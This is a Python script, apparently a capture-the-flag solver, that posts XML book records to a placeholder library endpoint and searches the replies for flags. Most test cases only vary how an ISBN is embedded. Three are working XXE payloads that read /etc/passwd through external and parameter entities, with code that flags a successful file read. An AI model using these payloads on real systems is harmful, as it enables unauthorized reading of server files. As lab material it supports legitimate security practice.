import requests
import re
import json

# Configuration
base_url = "http://library.deadend/books"
headers = {
    "Content-Type": "application/xml",
    "User-Agent": "Security-Research-Tool"
}

# Alternative ISBN embedding test cases
test_cases = [
    {
        "name": "ISBN as nested element within book",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <isbn>978-3-16-148410-0</isbn>
</book>"""
    },
    {
        "name": "ISBN as attribute on book",
        "payload": """<?xml version="1.0"?>
<book isbn="978-3-16-148410-0">
    <title>Security Testing</title>
    <author>Security Researcher</author>
</book>"""
    },
    {
        "name": "ISBN in CDATA in title",
        "payload": """<?xml version="1.0"?>
<book>
    <title><![CDATA[Security Testing ISBN:978-3-16-148410-0]]></title>
    <author>Security Researcher</author>
</book>"""
    },
    {
        "name": "ISBN as text in title",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing ISBN:978-3-16-148410-0</title>
    <author>Security Researcher</author>
</book>"""
    },
    {
        "name": "ISBN in author field",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Researcher ISBN:978-3-16-148410-0</author>
</book>"""
    },
    {
        "name": "Multiple ISBN elements",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <isbn>978-3-16-148410-0</isbn>
    <isbn>123-4-56-789012-3</isbn>
</book>"""
    },
    {
        "name": "Test publisher field",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <publisher>Security Press</publisher>
</book>"""
    },
    {
        "name": "Test year field",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <year>2024</year>
</book>"""
    },
    {
        "name": "Test category field",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <category>Computer Science</category>
</book>"""
    },
    {
        "name": "Test pages field",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <pages>300</pages>
</book>"""
    },
    {
        "name": "ISBN as XML comment",
        "payload": """<?xml version="1.0"?>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <!-- ISBN: 978-3-16-148410-0 -->
</book>"""
    }
]

# XXE test cases
xxe_test_cases = [
    {
        "name": "XXE External entity in title",
        "payload": """<?xml version="1.0"?>
<!DOCTYPE book [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<book>
    <title>Testing &xxe;</title>
    <author>Security Researcher</author>
</book>"""
    },
    {
        "name": "XXE Parameter entity",
        "payload": """<?xml version="1.0"?>
<!DOCTYPE book [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
</book>"""
    },
    {
        "name": "XXE with ISBN element",
        "payload": """<?xml version="1.0"?>
<!DOCTYPE book [
<!ENTITY isbnval SYSTEM "file:///etc/passwd">
]>
<book>
    <title>Security Testing</title>
    <author>Security Researcher</author>
    <isbn>&isbnval;</isbn>
</book>"""
    }
]

print("ALTERNATIVE ISBN EMBEDDING TESTS")
print("=" * 60)

success_count = 0
failure_count = 0
isbn_present = 0
error_details = []
successful_tests = []

for idx, test in enumerate(test_cases, 1):
    print(f"\n[TEST {idx}] {test['name']}")
    print("-" * 60)
    
    try:
        response = requests.post(base_url, headers=headers, data=test['payload'], timeout=10)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            success_count += 1
            successful_tests.append(test['name'])
            
            # Check if ISBN appears in response
            if 'isbn' in response.text.lower():
                isbn_present += 1
                print(f"[!] ISBN FIELD PRESENT IN RESPONSE")
        else:
            failure_count += 1
            error_details.append({
                'test': test['name'],
                'status': response.status_code,
                'response': response.text
            })
            print(f"[-] Request failed")
            
    except Exception as e:
        print(f"Error: {str(e)}")
        failure_count += 1

print("\n\nXXE VULNERABILITY TESTS")
print("=" * 60)

xxe_success = 0
xxe_failure = 0
xxe_vulnerable = 0

for idx, test in enumerate(xxe_test_cases, 1):
    print(f"\n[XXE {idx}] {test['name']}")
    print("-" * 60)
    
    try:
        response = requests.post(base_url, headers=headers, data=test['payload'], timeout=10)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        # Check for XXE success indicators
        if any(indicator in response.text.lower() for indicator in ['root:', 'daemon:', 'bin:']):
            xxe_vulnerable += 1
            print(f"[!] XXE VULNERABILITY DETECTED!")
        
        if response.status_code == 200:
            xxe_success += 1
        else:
            xxe_failure += 1
            
    except Exception as e:
        print(f"Error: {str(e)}")
        xxe_failure += 1

print("\n\nSUMMARY")
print("=" * 60)
print(f"ISBN Embedding Tests:")
print(f"  Success: {success_count}")
print(f"  Failed: {failure_count}")
print(f"  ISBN present in responses: {isbn_present}")
print(f"\nXXE Tests:")
print(f"  Success: {xxe_success}")
print(f"  Failed: {xxe_failure}")
print(f"  Vulnerable: {xxe_vulnerable}")

print(f"\nSuccessful tests: {successful_tests}")

if error_details:
    print(f"\nError details:")
    for err in error_details:
        print(f"  {err['test']}: {err['status']} - {err['response'][:100]}")

# Check for flags
print(f"\n\nFLAG SEARCH")
print("=" * 60)

all_responses = []
for test in test_cases + xxe_test_cases:
    try:
        r = requests.post(base_url, headers=headers, data=test['payload'], timeout=5)
        all_responses.append(r.text)
    except:
        pass

flags = []
for resp in all_responses:
    matches = re.findall(r'FLAG\{[^}]+\}', resp)
    if matches:
        flags.extend(matches)

if flags:
    print(f"[!] FLAGS FOUND: {flags}")
else:
    print("[ ] No flags found")
